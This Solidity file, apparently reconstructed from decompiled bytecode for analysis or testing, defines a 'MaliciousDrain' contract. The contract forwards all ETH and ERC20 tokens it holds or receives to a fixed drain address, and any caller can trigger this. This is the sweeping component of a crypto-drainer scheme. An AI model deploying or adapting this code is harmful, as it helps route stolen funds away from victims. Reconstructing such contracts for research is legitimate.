// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract MaliciousDrain {
    address payable public DRAIN_ADDR;
    constructor(address payable drainAddr) {
        DRAIN_ADDR = drainAddr;
    }

    // Function selector 0x17f2408f in decomp => drainTokens(address[] calldata tokens)
    function drainTokens(address[] calldata tokens) external {
        uint256 len = tokens.length;
        for (uint256 i = 0; i < len; ++i) {
            IERC20 token = IERC20(tokens[i]);
            uint256 bal = token.balanceOf(address(this));
            if (bal > 0) {
                // ignore return value for compatibility with many ERC20 tokens
                token.transfer(DRAIN_ADDR, bal);
            }
        }
    }

    // 0xe086e5ec
    function withdrawETH() external {
        uint256 bal = address(this).balance;
        if (bal > 0) {
            (bool ok, ) = DRAIN_ADDR.call{value: bal}("");
            // intentionally ignore ok to match original behavior (revert earlier if call fails in decomp)
            // but don't revert here to keep tests simple. If you want to revert on failure, uncomment:
            // require(ok, "eth transfer failed");
        }
    }

    // 0xf4f3b200
    function withdrawERC20(address token) external {
        uint256 bal = IERC20(token).balanceOf(address(this));
        if (bal > 0) {
            IERC20(token).transfer(DRAIN_ADDR, bal);
        }
    }

    // fallback/receive: forward ETH to DRAIN_ADDR when receiving plain ETH
    receive() external payable {
        if (msg.value > 0) {
            (bool ok, ) = DRAIN_ADDR.call{value: msg.value}("");
            // ignore ok for parity with decompiled pattern
        }
    }
}